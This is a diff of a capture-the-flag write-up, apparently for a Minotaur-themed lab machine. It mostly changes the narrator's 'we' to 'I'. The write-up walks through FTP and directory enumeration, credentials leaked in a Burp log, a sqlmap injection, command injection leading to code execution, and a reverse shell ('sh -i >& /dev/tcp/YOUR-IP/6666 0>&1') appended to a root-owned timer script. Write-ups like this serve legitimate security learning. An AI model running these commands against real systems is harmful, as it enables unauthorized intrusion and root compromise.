@@ -33,7 +33,7 @@ Let's explore further :)
 
 ![PIC_FTP2](https://user-images.githubusercontent.com/93183445/140650455-e0da12ec-90bd-451b-978c-88a7b2a8506e.png)
 
-Aaaand we got the fist flag!!!
+Aaaand I got the fist flag!!!
 
 keep_in_mind.txt (this info will come in handy a bit later):  
 <code>Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
@@ -56,7 +56,7 @@ In the meantime ffuf managed to finish:
 
 ![PIC_FUFF](https://user-images.githubusercontent.com/93183445/140650575-eccbffef-c76e-44a0-9854-bb71b9747314.png)
 
-Going through the directories, we can find something interesting in the logs directory.
+Going through the directories, I can find something interesting in the logs directory.
 It looks like a captured Burp request which reveals credentials.
 
 ---------------------------------------------------------------------------------
@@ -87,12 +87,12 @@ email=hidden&password=hidden
 ---------------------------------------------------------------------------------
 
 Because I got no response from the login, I turned to the ftp with these very creds, but this trip led to nowhere..
-Out of pure desperateness, I turned to the login page again, and got in :) 
+Out of pure desperateness, I tried the login page again, and got in :) 
 
 ![PIC_LANDING1](https://user-images.githubusercontent.com/93183445/140650895-ae7fdda0-ca6d-4505-86ac-e9750e928900.png)
 
-So far we have two names: 'Daedalus' and 'Minotaur'.  
-Plus we can appearantly search for 'People' and 'Creatures'.  
+So far I've got two names: 'Daedalus' and 'Minotaur'.  
+Plus I can appearantly search for 'People' and 'Creatures'.  
 Let's do that...
 
 ![PIC_LANDING2](https://user-images.githubusercontent.com/93183445/140650903-8dd321a7-1c95-4fd7-b6dd-b90e9cea2d5e.png)
@@ -101,7 +101,7 @@ Seems to be some kind of database thingy.. Let's catch the request with Burp and
 
 <code>sqlmap -r req_master.txt --dbs --batch --time-sec=3</code>
 
-Aaaaand we get a hit:
+Aaaaand there's a hit:
 
 ![PIC_SQLMAP1](https://user-images.githubusercontent.com/93183445/140650920-fe7f8b49-d593-4ee4-a906-6c0cce29b8f4.png)
 
@@ -111,11 +111,11 @@ Dump it:
 
 ![PIC_SQLMAP3](https://user-images.githubusercontent.com/93183445/140650932-0d1a0c5a-21c6-4d44-993f-846400eff686.png)
 
-As the newly found user with admin rights is in the same table as Daedalus, with whom we were able to login  
+As the newly found user with admin rights is in the same table as Daedalus, with whom I was able to login  
 before, let's find out if we get in with these creds, after a short trip to Crackstation..  
 (https://crackstation.net)
 
-After we log in, we can find the flag in the upper left corner of the site. Besides that, there is a
+After the successful login, the flag is in the upper left corner of the site. Besides that, there is a
 hyperlink "Secret_Stuff".  
 That sounds interesting enough to follow that. Who could resist that..?
 
@@ -130,7 +130,7 @@ This site led me finally to using backticks, instead of quotation marks.
 
 ![PIC_RCE1](https://user-images.githubusercontent.com/93183445/140650956-67398bff-8298-49e7-920f-57642485ca02.png)
 
-So we got rce, let's explore that. And we can find flag3 in the user home directory, which we also are able to read.  
+So say hello to rce and explore that. And there's flag3 in the user home directory, which is also readable.  
 
 Let's try \`cat /home/user\`
 
@@ -167,7 +167,7 @@ Plus, it is owned by root.. So let's abuse that and pack a rev-shell in that ver
   
 <code>echo 'sh -i >& /dev/tcp/YOUR-IP/6666 0>&1' >> timer.sh</code>  
 
-Start another listener and it will connect without any further doing. Now you're root _tataaaa_ \
+Start another listener and it will connect without any further doing. Now I'm root _tataaaa_ \
 So let's go and get the final flag in the /root directory:
 
 ![PIC_FINAL](https://user-images.githubusercontent.com/93183445/140651348-8391acb8-eb86-438f-9e62-20d61c21fa4f.png)
